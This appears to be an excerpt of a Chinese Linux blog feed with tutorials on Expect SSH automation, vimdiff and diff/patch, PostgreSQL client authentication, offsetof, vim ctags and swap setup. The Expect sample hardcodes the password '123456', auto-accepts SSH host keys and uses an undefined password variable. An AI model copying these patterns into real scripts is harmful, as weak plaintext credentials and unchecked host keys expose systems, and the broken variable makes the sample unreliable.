        <content type="html"><![CDATA[<p>Expect中最关键的四个命令是send,expect,spawn,interact。</p><ul><li>send：用于向进程发送字符串</li><li>expect：从进程接收字符串 {捕捉返回信息中的字符串}</li><li>spawn：启动新的进程　　 {启动新的进程}</li><li>interact：允许用户交互</li></ul><a id="more"></a><p><br></p><h5 id="1-［set-timeout-30］"><a href="#1-［set-timeout-30］" class="headerlink" title="1.    ［set timeout 30］"></a>1.    ［set timeout 30］</h5><p>基本上认识英文的都知道这是设置超时时间的，现在你只要记住他的计时单位是：秒 。timeout -1 为永不超时</p><p><br></p><h5 id="2-［spawn-ssh-username-ip］-可用于ssh-scp-等自动化"><a href="#2-［spawn-ssh-username-ip］-可用于ssh-scp-等自动化" class="headerlink" title="2.    ［spawn ssh username@ip］ 可用于ssh,scp 等自动化"></a>2.    ［spawn ssh username@ip］ 可用于ssh,scp 等自动化</h5><p>spawn是进入expect环境后才可以执行的expect内部命令，如果没有装expect或者直接在默认的SHELL下执行是找不到spawn命令的。所以不要用 “which spawn“之类的命令去找spawn命令。好比windows里的dir就是一个内部命令，这个命令由shell自带，你无法找到一个dir.com 或 dir.exe 的可执行文件。</p><p>它主要的功能是给ssh运行进程加个壳，用来传递交互指令。</p><p><br></p><h5 id="3-［expect-“password-”］"><a href="#3-［expect-“password-”］" class="headerlink" title="3.    ［expect “password:”］"></a>3.    ［expect “password:”］</h5><p>这里的expect也是expect的一个内部命令，有点晕吧，expect的shell命令和内部命令是一样的，但不是一个功能，习惯就好了。这个命令的意思是判断上次输出结果里是否包含“password:”的字符串，如果有则立即返回，否则就等待一段时间后返回，这里等待时长就是前面设置的30秒</p><p><br></p><h5 id="4-［send-“ispass-r”］"><a href="#4-［send-“ispass-r”］" class="headerlink" title="4.    ［send “ispass\r”］"></a>4.    ［send “ispass\r”］</h5><p>这里就是执行交互动作，与手工输入密码的动作等效。</p><p>[send “$password\r”]   //此处是使用变量 设置变量可用 set 命令 例: {set password 123456 } 可直接使用 $进行引用</p><p>温馨提示： 命令字符串结尾别忘记加上“\r”，如果出现异常等待的状态可以核查一下。</p><p><br></p><h5 id="5-［interact］"><a href="#5-［interact］" class="headerlink" title="5.    ［interact］"></a>5.    ［interact］</h5><p>执行完成后保持交互状态，把控制权交给控制台，这个时候就可以手工操作了。如果没有这一句登录完成后会退出，而不是留在远程终端上。如果你只是登录过去执行</p><p><br></p><h5 id="6-argv-参数数组"><a href="#6-argv-参数数组" class="headerlink" title="6.    $argv 参数数组"></a>6.    $argv 参数数组</h5><p>expect脚本可以接受从bash传递过来的参数.可以使用[lindex $argv n]获得，n从0开始，分别表示第一个,第二个,第三个….参数</p><p><br></p><h5 id="7-示例Code"><a href="#7-示例Code" class="headerlink" title="7.    示例Code:"></a>7.    示例Code:</h5><pre><code>./scp-expect.sh   ./update/${dest_file}  ${username}@${src_ip}:${src_file}  ${userpwd} </code></pre><p>cat scp-expect.sh</p><pre><code>#!/usr/local/bin/expectset timeout -1  // 设置超时时间， timeout -1 为永不超时set user  [lindex $argv 0]set dest_ip [lindex $argv 1] //使用[lindex $argv n]获得，n从0开始，分别表示第一个,第二个,第三个....参数//[send &quot;$password\r&quot;]   --&gt; 此处是使用变量  设置变量可用  set 命令 例: {set password 123456 } 可直接使用 $进行引用set passwd 123456spawn /usr/bin/ssh $user@$dest_ip     //spawn：启动新的进程　　   {启动新的进程}expect {    &quot;yes/no&quot;   {  send &quot;yes\r&quot;; expect_continue }     // expect_continue;    &quot;password&quot; {  send &quot;$ispass\r&quot; }}send &quot;useradd -m Postgres\r&quot;    // 发送到 tty 即将执行的命令send &quot;passwd Postgres\r&quot;expect {                            // 进行捕抓   关键字    &quot;New password:&quot;        { send &quot;123456\r&quot;}    &quot;Retype new password:&quot; { send &quot;123456\r&quot;}}send &quot;cp -rf ~/winpay  /home/Postgres/\r&quot;send &quot;chown -R Postgres:Postgres /home/Postgres/winpay\r&quot;send &quot;su - Postgres\r&quot;send &quot;cd ~/winpay/bill_send/ &amp;&amp; make\r&quot;send &quot;echo  启动bin/bill_send\r&quot;interact  //执行完成后保持交互状态，把控制权交给控制台，这个时候就可以手工操作expect eof</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 源码比对工具</title>
      <link href="/2017/08/27/commands/Linux%E6%BA%90%E7%A0%81%E6%AF%94%E5%AF%B9%E5%B7%A5%E5%85%B7/"/>
      <url>/2017/08/27/commands/Linux%E6%BA%90%E7%A0%81%E6%AF%94%E5%AF%B9%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p><strong>源程序文件比较和合并一直是软件开发过程中比较重要的组成部分， Window IDE 大行其道， Linux传统命令行工具可能就寥寥无几。</strong> </p><p><strong>Linux 传统比较工具常用 diff patch 组合 另一个可能就是vimdiff</strong>  </p><blockquote><p>vimdiff : 拥有简洁明了的界面，能对比较结果一目了然，对差异快速定位，容易进行文件合并<br>diff/patch:获取补丁文件，进行全部差异性更改</p></blockquote><a id="more"></a><p><br></p><h4 id="1-vimdiff"><a href="#1-vimdiff" class="headerlink" title="1.    vimdiff"></a>1.    vimdiff</h4><ol><li><p>首先检查vimdiff是否可用， vimdiff 同时基于vim 与 diff命令 , vimdiff基础用法:</p><p>  vimdiff filename1 filename2</p><p>此处执行vimdiff命令显示结果画面<br><img src="/img/linux/vimdiff_01.png" alt="vimdiff filename1 filename2"></p></li></ol><ol><li><p>光标移动  与 上下文展开查看</p><p>移动光标，左右两侧屏幕滚动是同步的， 这是因为”scrollbind”选项被设置的结果，vim尽量保证两侧文件对齐.</p><p>取消设置:<br>  set noscrollbind</p><p>2.1     ctrl - w  来控制左右页面切换</p><p>2.2        可以使用  h、j、k、l  控制上下左右</p><p>2.3     提供快捷键在各个差异点之间快速移动，跳转:<br> 正向:  ]c     /     反向跳转: [c</p><p>2.4     zo  (floding open  用于打开折叠)   zc(folding close  重新折叠)</p><p>可以与第一张图比较差异：<br><img src="/img/linux/vimdiff_zo_01.png" alt=""></p></li></ol><ol><li><p>文件合并</p><ol><li><p>将当前文件差异复制到另外一个文件中:<br>dp  （diff  “put”）</p></li><li><p>把另一个文件内容复制到当前文件中:<br>do  (diff “get”, dg已经被占用)</p></li><li><p>重新比较文件，来实时反应比较结果：<br> diffupdate</p></li><li><p>撤销修改<br>&lt; ESC &gt;, u</p></li></ol></li><li><p>合并结束后，接下来的操作当前是保存。</p><ol><li>qa (quit all)  同时退出，且不保存</li><li>wa (write all) 同时保存</li><li>wqa(write,then quit all)  同时保存，并退出</li><li>qa！(force to quit all)   强制退出，且不保存任何操作</li></ol></li></ol><p><br></p><h4 id="2-diff-patch组合补丁"><a href="#2-diff-patch组合补丁" class="headerlink" title="2. diff/patch组合补丁"></a>2. diff/patch组合补丁</h4><ol><li><p>diff</p><p>个人比较常用:</p><p>  diff  -ruN filename1 filename2</p><p>输入如下:</p><p><img src="/img/linux/diff_01.png" alt="diff 对比"></p><p>filename2 比 filename1 变化了哪些。</p></li><li><p>patch  <a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_71/com.ibm.aix.cmds4/patch.htm" target="_blank" rel="noopener">IBM  patch解析</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch [option] [origfile]  [patchfile]</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">diff -ruN filename1 filename2  &gt; patch.log    #生成补丁信息文件</span><br><span class="line">patch filename1  patch.log                    #利用patch文件打补丁</span><br></pre></td></tr></table></figure><pre><code>比较filename1 与 filename2 差别: 生成信息补丁 。对filename1 进行补全， 此时filename1 将与filename2 信息保持一致;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Tcp/ip无法连接到Postgresql 数据库，SSL关闭状态</title>
      <link href="/2017/08/26/database/tcp-ip-connect-SSL-off/"/>
      <url>/2017/08/26/database/tcp-ip-connect-SSL-off/</url>
      
        <content type="html"><![CDATA[<h4 id="1-Postgres客户端链接异常"><a href="#1-Postgres客户端链接异常" class="headerlink" title="1. Postgres客户端链接异常"></a>1. Postgres客户端链接异常</h4><blockquote><p> FATAL:  no pg_hba.conf entry for host “39.64.198.83”, user “test”, database “testdb”, SSL off<br>QPSQL: Unable to connect</p></blockquote><ol><li>此处两个异常错误 <ol><li>39.64.198.83 ip登陆验证用户test数据库testdb时客户端验证不通过<br>改正: 修改对pg_hba.conf对ip限制即可</li><li>SSL OFF 未启用 </li></ol></li></ol><a id="more"></a><p><br></p><h4 id="2-启用客户端验证"><a href="#2-启用客户端验证" class="headerlink" title="2. 启用客户端验证"></a>2. 启用客户端验证</h4><p> Postgresql 的客户端验证有一个名为 pg_hda.conf 的配置文件控制。 hda的意思是[基于主机的验证](host-based authentication)</p><p>pg_hda.conf 文件的格式， 具体参数可以参考<a href="https://wiki.postgresql.org/wiki/9.1%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0" target="_blank" rel="noopener">官方文档</a></p><pre><code># TYPE  DATABASE     USER     ADDRESS      METHOD   [auth-options]</code></pre><ul><li><p>type 参数可选:</p><ul><li><p>local  </p><p>  This record matches connection attempts using Unix-domain sockets. Without a record of this type, Unix-domain socket connections are disallowed.</p><p>  这个记录匹配通过unix套接字的进行的连接请求。没有这种类型的记录，unix套接字连接将会被禁止</p></li><li><p>host</p><p>  This record matches connection attempts made using TCP/IP. host records match either SSL or non-SSL connection attempts.</p><p>  这个记录匹配通过TCP/IP的进行的连接请求。host记录匹配SSL或者非SSL的连接 注意：除非服务器带着合适的 listen_addresses 配置参数值启动，否则远程的TCP/IP将不能连接。因为缺省只监听本地回环地址localhost的TCP/IP连接。</p></li><li><p>hostssl</p><p>  This record matches connection attempts made using TCP/IP, but only when the connection is made with SSL encryption.</p><p>  To make use of this option the server must be built with SSL support. Furthermore, SSL must be enabled at server start time by setting the ssl configuration parameter (see Section 17.9 for more information).</p><p>  这个记录匹配通过TCP/IP进行的连接请求，但是只能使用SSL加密进行连接。要用这个选项，服务器必须要支持SSL。此外，当服务器启动的时候必须通过设置将SSL启用</p></li><li><p>hostnossl</p><p>  This record type has the opposite behavior of hostssl; it only matches connection attempts made over TCP/IP that do not use SSL.</p><p>  这个记录刚好与hostssl的逻辑相反；它只能匹配用TCP/IP但是不用SSL的连接。</p></li></ul></li><li><p>Database</p><p>   Specifies which database name(s) this record matches. The value all specifies that it matches all databases. The value sameuser specifies that the record matches if the requested database has the same name as the requested user. The value samerole specifies that the requested user must be a member of the role with the same name as the requested database. </p><p>   指定记录匹配的数据库名。值all将匹配所有的数据库。值sameuser表示如果请求连接的数据库名和用户名相同，则匹配。值samegroup表示请求的用户必须是与数据库同名的组中的成员。值replication表示如果一个replication的连接被请求，则匹配</p></li><li><p>user</p><p>   Specifies which database user name(s) this record matches. The value all specifies that it matches all users. Otherwise, this is either the name of a specific database user, or a group name preceded by +.</p><p>   为这条记录声明所匹配的PostgreSQL用户。值all表示匹配所有用户。否则，它就是特定的数据库用户的名字，组名字可以通过用 + 做组名字前缀来声明</p></li><li><p>address</p><p>   Specifies the client machine address(es) that this record matches. This field can contain either a host name, an IP address range, or one of the special key words mentioned below.</p><p>   声明这条记录匹配的客户端机器的地址。这个字段可以包含一个主机名、一个IP地址范围或者下面提到的特殊关键字</p></li><li><p>METHOD</p><ul><li><p>trust</p><p>无条件的允许连接。这个方法允许任何人用任意一个PostgreSQL用户登录到PostgreSQL数据库。</p></li><li><p>reject</p><p>无条件的拒绝连接。这对于过滤一个组中的某些主机非常有用，例如，一个reject的行能够阻止一个指定的主机连接。而允许特定的网络中其他主机的连接。</p></li><li><p>md5</p><p>要求客户端提供一个MD5加密的口令进行认证。请查阅Section 19.3节获取详细的信息。</p></li><li><p>password</p><p>要求客户提供一个未加密的密码进行身份验证。因为口令是以明文形式在网络上传递的，所以我们不应该在不安全的网络上使用这个方式。请参阅 Section 19.2.2 获取详细信息。</p></li><li><p>krb5</p><p>使用Kerberos V5来进行认证用户。这只对TCP/IP连接有效。请参阅Section 19.3.5获取详细信息。</p></li><li><p>ident</p><p>获取客户端的操作系统的用户名，然后联系客户端上的ident服务器并检查是否和要求的数据库用户名匹配。Ident认证只对TCP/IP连接有效。如果是本地连接，将会被peer认证方法替换。请参阅Section 19.3.6获取详细信息。</p></li><li><p>peer</p><p>从操作系统获取操作系统的用户名，然后检查它是否和请求的数据库名相匹配。这只对本地连接有效。请参阅Section 19.3.7获取详细信息。</p></li><li><p>ldap</p><p>用LDAP服务器进行认证，请参阅Section 19.3.8获取详细信息。</p></li><li><p>radius</p><p>用RADIUS服务器进行认证。</p></li><li><p>cert</p><p>用SSL客户端证书进行认证，请参阅Section 19.3.10获取详细信息。</p></li><li><p>pam</p><p>使用操作系统提供的可插入的认证模块服务（Authenticate using the Pluggable Authentication Modules）（PAM）。</p></li></ul></li></ul><p><br></p><h4 id="3-启用Tcp-Ip-链接"><a href="#3-启用Tcp-Ip-链接" class="headerlink" title="3.启用Tcp/Ip 链接"></a>3.启用Tcp/Ip 链接</h4><pre><code>postgresql.conf 配置文件掌管是否允许Tcp/Ip链接listen_addresses = &apos;*&apos; #what ip address to listen on;                       # comma-separated list of addresses;                       # defaults to &apos;localhost&apos;; use &apos;*&apos; for all</code></pre><p><br></p><h4 id="4-SSL加密"><a href="#4-SSL加密" class="headerlink" title="4. SSL加密"></a>4. SSL加密</h4><p>Postgresql 本机支持使用ssl链接对客户端/服务器通讯协议进行加密，以增强安全性</p><ol><li><p>缺省, Postgresql不会执行任何服务器证书验证，这意味着可以在客户端没有察觉的情况下骗过服务认证(修改DNS记录，接管服务ip地址)</p><p>  同样位于postgresql.conf配置文件下:<br>  ssl = true<br>  ssl_cert_file = ‘xxx.pem’<br>  ssl_key_file = ‘xxx.key’</p><p><a href="http://www.postgres.cn/docs/9.4/ssl-tcp.html" target="_blank" rel="noopener">官方文档</a></p><p>创建自签名证书</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>offsetof 函数解析</title>
      <link href="/2017/08/18/cpluscplus/offsetof%20%E5%81%8F%E7%A7%BB%E5%87%BD%E6%95%B0/"/>
      <url>/2017/08/18/cpluscplus/offsetof%20%E5%81%8F%E7%A7%BB%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<pre><code>NAME       offsetof - offset of a structure memberSYNOPSIS       #include &lt;stddef.h&gt;       size_t offsetof(type, member);DESCRIPTION       The macro offsetof() returns the offset of the field member from the start of the structure type.       This  macro  is useful because the sizes of the fields that compose a structure can vary across implementations, and compilers may       insert different numbers of padding bytes between fields.  Consequently, an element&apos;s offset is not necessarily given by  the  sum       of the sizes of the previous elements.       A compiler error will result if member is not aligned to a byte boundary (i.e., it is a bit field).RETURN VALUE       offsetof() returns the offset of the given member within the given type, in units of bytes.CONFORMING TO       C89, C99, POSIX.1-2001.</code></pre><a id="more"></a><blockquote><h3 id="原型"><a href="#原型" class="headerlink" title="原型:"></a>原型:</h3><pre><code>#define offsetof(s,m) (size_t)&amp;(((s *)0)-&gt;m)</code></pre><h3 id="example"><a href="#example" class="headerlink" title="example:"></a>example:</h3></blockquote><pre><code>    #include &lt;stdio.h&gt;    #include &lt;stddef.h&gt;    typedef struct node    {            int id;            int age;            char name[12];            char address[32];    }node;    int main(void)    {            printf(&quot;id in node size_t seek %d\n&quot;, (size_t)&amp;(((node *)0)-&gt;id)); // 原型            printf(&quot;id in node size_t seek %d\n&quot;, offsetof(node, id));            printf(&quot;age in node size_t seek %d\n&quot;, offsetof(node, age));            printf(&quot;name in node size_t seek %d\n&quot;, offsetof(node, name));            printf(&quot;address in node size_t seek %d\n&quot;, offsetof(node, address));            return 0;    }    ./offsetof  输出结果:    id in node size_t seek 0    id in node size_t seek 0    age in node size_t seek 4    name in node size_t seek 8    address in node size_t seek 20</code></pre><blockquote><h3 id="解析"><a href="#解析" class="headerlink" title="解析:"></a>解析:</h3><pre><code>(size_t)&amp;(((node *)0)-&gt;id)    (node *)0   ==&gt;  malloc(sizeof(node))  ==&gt; node *pnode;因为id 是node结构体的第一个元素，在此 去pnode-&gt;id  的地址 其实与 pnode 的地址是一致的，可以使用 %p 查看输出地址信息    printf(&quot;pnode = %p\n&quot;,  pnode);    printf(&quot;&amp;(pnode-&gt;id) = %p\n&quot;,  &amp;(pnode-&gt;id));    pnode = 0x1912010    &amp;(pnode-&gt;id) = 0x1912010</code></pre><h5 id="故"><a href="#故" class="headerlink" title="故:"></a>故:</h5><pre><code>(node *)0  ==&gt;  node *pnode = (node *)0; 此时的pnode = 0x0000;&amp;(((node *)0)-&gt;id)  ==&gt; &amp;(pnode-&gt;id)  即 id 的地址；最后强转为size_t ;</code></pre></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>命令在bash终端和脚本执行结果不一致问题</title>
      <link href="/2017/08/17/gram/shell_%E5%91%BD%E4%BB%A4%E5%9C%A8bash%E7%BB%88%E7%AB%AF%E5%92%8C%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%8D%E4%B8%80%E8%87%B4%E9%97%AE%E9%A2%98/"/>
      <url>/2017/08/17/gram/shell_%E5%91%BD%E4%BB%A4%E5%9C%A8bash%E7%BB%88%E7%AB%AF%E5%92%8C%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%8D%E4%B8%80%E8%87%B4%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h4 id="一-cat-checksock-sh"><a href="#一-cat-checksock-sh" class="headerlink" title="一: cat checksock.sh"></a>一: cat checksock.sh</h4><pre><code>[root@pgunimation ~]# cat checksock.sh #!/bin/bashnum=$(ps -ef| grep sock | wc -l)echo &apos;Num = &apos;  $num</code></pre><a id="more"></a><p><br></p><p><img src="/img/shell/ps_error_01.png" alt="状况"></p><pre><code>发现结果输出并不一致;</code></pre><h4 id="二-修改语句"><a href="#二-修改语句" class="headerlink" title="二: 修改语句"></a>二: 修改语句</h4><pre><code>vi checksock.sh    num=$(ps -ef| grep sock )</code></pre><p><img src="/img/shell/ps_error_02.png" alt="查看输出"></p><p>输出结果</p><blockquote><p>   root 808 1 0 Aug12 ? 00:00:36 /usr/bin/python /usr/bin/ssserver -c /etc/shadowsocks.json<br>   root 12392 12202 0 22:03 pts/0 00:00:00 ./sock<br>   root 12399 12202 0 22:03 pts/0 00:00:00 /bin/bash ./checksock.sh<br>   root 12400 12399 0 22:03 pts/0 00:00:00 /bin/bash ./checksock.sh<br>   root 12402 12400 0 22:03 pts/0 00:00:00 grep sock</p></blockquote><p>发现本身还输出自己调用sh脚本；</p><p>修改为:</p><pre><code>num=$(ps -ef| grep -v 脚本名 | grep sock | wc -l) grep:    -v, --invert-match        select non-matching lines</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vim配置ctags + taglist</title>
      <link href="/2017/08/16/software/vim%E9%85%8D%E7%BD%AEctags-taglist/"/>
      <url>/2017/08/16/software/vim%E9%85%8D%E7%BD%AEctags-taglist/</url>
      
        <content type="html"><![CDATA[<ul><li>基于CentOS Linux release 7.1.1503 (Core) </li></ul><h4 id="安装-ctags"><a href="#安装-ctags" class="headerlink" title="安装 ctags"></a>安装 ctags</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install ctags</span><br></pre></td></tr></table></figure><h4 id="安装taglist"><a href="#安装taglist" class="headerlink" title="安装taglist"></a>安装<a href="https://sourceforge.net/projects/vim-taglist/files/vim-taglist/" target="_blank" rel="noopener">taglist</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">taglist</span><br><span class="line">├── doc</span><br><span class="line">│   └── taglist.txt</span><br><span class="line">└── plugin</span><br><span class="line">    └── taglist.vim</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> sudo cp taglist/doc/taglist.txt /usr/share/vim/vim74/doc/</span><br><span class="line"> sudo cp taglist/plugin/taglist.vim  /usr/share/vim/vim74/plugin/</span><br></pre></td></tr></table></figure><h4 id="配置-vimrc"><a href="#配置-vimrc" class="headerlink" title="配置 .vimrc"></a>配置 <code>.vimrc</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&quot; 设置忽略大小写;</span><br><span class="line">set ignorecase</span><br><span class="line">&quot; 设置tab 4空格;</span><br><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line"></span><br><span class="line">set expandtab</span><br><span class="line"></span><br><span class="line">&quot;对齐风格</span><br><span class="line">set cino=g0,:0</span><br><span class="line"></span><br><span class="line">&quot;设置行号</span><br><span class="line">set number</span><br><span class="line"></span><br><span class="line">&quot;共享粘贴板;</span><br><span class="line">set mouse=a</span><br><span class="line"></span><br><span class="line">&quot;自动缩进 与C语言峰哥;</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line"></span><br><span class="line">&quot; 设置ctags 往上查找;</span><br><span class="line">set tags=tags;/</span><br><span class="line"></span><br><span class="line">let Tlist_Auto_Open=1  &quot;自动打开</span><br><span class="line">let Tlist_Show_One_File=1  &quot;只显示当前文件的tags</span><br><span class="line">let Tlist_WinWidth=40      &quot;设置taglist宽度</span><br><span class="line">let Tlist_Exit_OnlyWindow=1 &quot;taglist窗口是最后一个窗口</span><br><span class="line">let Tlist_Use_Left_Window=1 &quot;在Vim窗口右侧显示taglist窗口;</span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## 重新生成tags文件</span><br><span class="line">ctags -R *   </span><br><span class="line">vim src/main.c  ## 即可显示taglist窗口;</span><br></pre></td></tr></table></figure><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><ul><li><p><code>help tags</code></p><ul><li><code>ctrl+]</code>   打开并跳转到函数定义处</li><li><code>ctrl+t</code> 返回到上一个标签处</li><li><code>g+]</code>    在当前窗口下显示tag索引信息</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vim篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Window DevDocs</title>
      <link href="/2017/08/16/software/Window-DevDocs/"/>
      <url>/2017/08/16/software/Window-DevDocs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>　　devdocs是一个开源的文档浏览应用。跟dash一样，它把HTML源文档转换成带索引的docset规格，以供用户查看。不过devdocs是一个用rails写的web应用而非本地应用，文档作为静态资源由服务器提供，交互则是通过浏览器页面完成。你可以在devdocs.io使用该应用，也可以在自己的电脑上部署它。注意devdocs提供了offline的选项，可以把数据写入到浏览器的indexeddb中，避免了每次从服务器获取数据带来的延迟。</p></blockquote><a id="more"></a><p>访问网址：<br>    <a href="http://devdocs.io/" target="_blank" rel="noopener">http://devdocs.io/</a></p><p>本地访问:<br><img src="/img/software/devdoc_01.png" alt="DevDoc"></p><p><img src="/img/software/devdoc_02.png" alt="DevDoc"></p><p><img src="/img/software/devdoc_03.png" alt="DevDoc"></p><p>即可缓存到浏览器本地;</p>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>swap 制作交换分区</title>
      <link href="/2017/08/10/yunwei/Swap%E4%BA%A4%E6%8D%A2%E5%88%86%E5%8C%BA/"/>
      <url>/2017/08/10/yunwei/Swap%E4%BA%A4%E6%8D%A2%E5%88%86%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h5 id="Linux-交换分区作用"><a href="#Linux-交换分区作用" class="headerlink" title="Linux 交换分区作用:"></a>Linux 交换分区作用:</h5><blockquote><p>　　Linux内核为了提高读写效率与速度，会将文件在内存中进行缓存，这部分内存就是Cache Memory(缓存内存)。即使你的程序运行结束后，Cache Memory也不会自动释放。这就会导致你在Linux系统中程序频繁读写文件后，你会发现可用物理内存变少。当系统的物理内存不够用的时候，就需要将物理内存中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间被临时保存到Swap空间中，等到那些程序要运行时，再从Swap分区中恢复保存的数据到内存中。这样，系统总是在物理内存不够时，才进行Swap交换。</p></blockquote><p><br></p><a id="more"></a><h5 id="系统的Swap分区大小设置多大才是最优呢？-关于这个问题，应该说只能有一个统一的参考标准，具体还应该根据系统实际情况和内存的负荷综合考虑，像ORACLE的官方文档就推荐如下设置，这个是根据物理内存来做参考的"><a href="#系统的Swap分区大小设置多大才是最优呢？-关于这个问题，应该说只能有一个统一的参考标准，具体还应该根据系统实际情况和内存的负荷综合考虑，像ORACLE的官方文档就推荐如下设置，这个是根据物理内存来做参考的" class="headerlink" title="系统的Swap分区大小设置多大才是最优呢？ 关于这个问题，应该说只能有一个统一的参考标准，具体还应该根据系统实际情况和内存的负荷综合考虑，像ORACLE的官方文档就推荐如下设置，这个是根据物理内存来做参考的"></a>系统的Swap分区大小设置多大才是最优呢？ 关于这个问题，应该说只能有一个统一的参考标准，具体还应该根据系统实际情况和内存的负荷综合考虑，像ORACLE的官方文档就推荐如下设置，这个是根据物理内存来做参考的</h5><blockquote><p>  4G以内的物理内存，SWAP 设置为内存的2倍。<br>  4-8G的物理内存， SWAP 等于内存大小。<br>  8-64G 的物理内存，SWAP 设置为8G。<br>  64-256G物理内存， SWAP 设置为16G。</p></blockquote><p><br></p><h5 id="Swap交换分区对性能的影响"><a href="#Swap交换分区对性能的影响" class="headerlink" title="Swap交换分区对性能的影响"></a>Swap交换分区对性能的影响</h5><blockquote><p>　　首先，当物理内存不足以支撑系统和应用程序（进程）的运作时，这个Swap交换分区可以用作临时存放使用率不高的内存分页，把腾出的内存交给急需的应用程序（进程）使用。有点类似机房的UPS系统，虽然正常情况下不需要使用，但是异常情况下， Swap交换分区还是会发挥其关键作用。</p><p>　　其次，即使你的服务器拥有足够多的物理内存，也有一些程序会在它们初始化时残留的极少再用到的内存分页内容转移到 swap 空间，以此让出物理内存空间。对于有发生内存泄漏几率的应用程序（进程），Swap交换分区更是重要，因为谁也不想看到由于物理内存不足导致系统崩溃。</p><p>　　最后，现在很多个人用户在使用Linux，有些甚至是PC的虚拟机上跑Linux系统，此时可能常用到休眠（Hibernate），这种情况下也是推荐划分Swap交换分区的。</p><p>　　其实少量使用Swap交换空间是不会影响性能，只有当RAM资源出现瓶颈或者内存泄露，进程异常时导致频繁、大量使用交换分区才会导致严重性能问题。另外使用Swap交换分区频繁，还会引起kswapd0进程（虚拟内存管理中, 负责换页的）耗用大量CPU资源，导致CPU飙升。</p></blockquote><p><br></p><h5 id="Swap分区空间什么时候使用"><a href="#Swap分区空间什么时候使用" class="headerlink" title="Swap分区空间什么时候使用"></a>Swap分区空间什么时候使用</h5><blockquote><p>　　系统在什么情况或条件下才会使用Swap分区的空间呢？ 其实是Linux通过一个参数swappiness来控制的。当然还涉及到复杂的算法。</p><p>　　这个参数值可为 0-100，控制系统 swap 的使用程度。高数值可优先系统性能，在进程不活跃时主动将其转换出物理内存。低数值可优先互动性并尽量避免将进程转换处物理内存，并降低反应延迟。默认值为 60。</p></blockquote><p>两种办法修改swappiness参数:</p><pre><code>1.    临时修改    1.1        echo 10 &gt; /proc/sys/vm/swappiness    1.2        sysctl vm.swappiness=102.    永久修改    2.1          echo &apos;vm.swappiness=10&apos; &gt;&gt; /etc/sysctl.conf    </code></pre><p><br></p><h5 id="配置Linux交换分区"><a href="#配置Linux交换分区" class="headerlink" title="配置Linux交换分区:"></a>配置Linux交换分区:</h5><h6 id="1-dd-制作swap交换分区"><a href="#1-dd-制作swap交换分区" class="headerlink" title="1.  dd 制作swap交换分区:"></a>1.  dd 制作swap交换分区:</h6><pre><code>dd if=/dev/zero of=/media/swap bs=1024 count=1048576建立1.1G 名称为swap交换文件</code></pre><h6 